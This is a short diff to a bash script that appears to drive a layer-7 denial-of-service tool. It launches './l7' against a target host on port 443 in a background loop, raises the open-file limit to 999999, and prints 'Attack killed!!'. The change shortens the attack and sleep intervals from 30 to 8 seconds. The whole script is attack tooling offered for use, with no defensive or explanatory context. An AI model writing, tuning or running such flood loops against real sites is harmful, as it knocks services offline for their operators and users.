@@ -1,5 +1,5 @@
 #!/bin/bash
-atk_cmd="./l7 site.com 443 / 1600 30"
+atk_cmd="./l7 site.com 443 / 1600 8"
 process=1
 ulimit -n 999999
 
@@ -11,6 +11,6 @@ do
         $atk_cmd >/dev/null &
         sleep 0.1
     done
-    sleep 30
+    sleep 8
     echo Attack killed!!
 done
